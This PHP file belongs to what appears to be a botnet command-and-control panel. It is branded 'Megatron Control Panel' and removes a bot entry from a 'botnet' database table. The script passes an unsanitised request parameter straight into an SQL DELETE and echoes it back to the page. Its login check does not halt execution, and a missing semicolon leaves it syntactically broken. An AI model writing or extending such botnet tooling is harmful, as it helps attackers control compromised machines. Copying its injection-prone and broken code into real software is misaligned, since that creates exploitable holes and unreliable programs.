<?php
 /******************************************************************************************
           ____    ____                        ____  ____                       __  
          |_   \  /   _|                      |_   ||   _|                     |  ] 
            |   \/   |   .--.   _ .--.   .--.   | |__| |   ,--.   _ .--.   .--.| |  
            | |\  /| | / .'`\ \[ `.-. |/ .'`\ \ |  __  |  `'_\ : [ `/'`\]/ /'`\' |  
           _| |_\/_| |_| \__. | | | | || \__. |_| |  | |_ // | |, | |    | \__/  |  
          |_____||_____|'.__.' [___||__]'.__.'|____||____|\'-;__/[___]    '.__.;__] . .   .-.    . 
                                                                                    | |   |\|   '| 
                 By Carlos Ganoza || www.todoporelvicio.com                         `.'   `-' .  '
 ******************************************************************************************/
session_start();
if(!isset($_SESSION['sesion'])){
header("location:login.php?error=1");
}
echo "<meta http-equiv='refresh' content=5;url='./cpanel.php' />"
echo '<body><link href="stile.css" rel="stylesheet" type="text/css"/>
<p align="right" class="verhead"><span class="bar"><a href="logout.php">Close Session</a></p>
<p class="titulo">Megatron Control Panel</p>
<pre class="subtitulo">Powered by MonoHard</pre>';

$id=isset($_GET['id'])  ?  $_GET['id']   :  NULL;
include('conexion.php');

$ip=($_SERVER['REMOTE_ADDR']);
$result = mysql_query("DELETE FROM bot WHERE id='".$id."'");
//if (mysql_num_rows($result) > 0  ) 
//{
	echo "<pre class='subtitulo'>ID ".$_GET['id']." removed from botnet
<a href='./cpanel.php'>Returning to Panel in 5 secs</a></pre>";
	
//}
?>



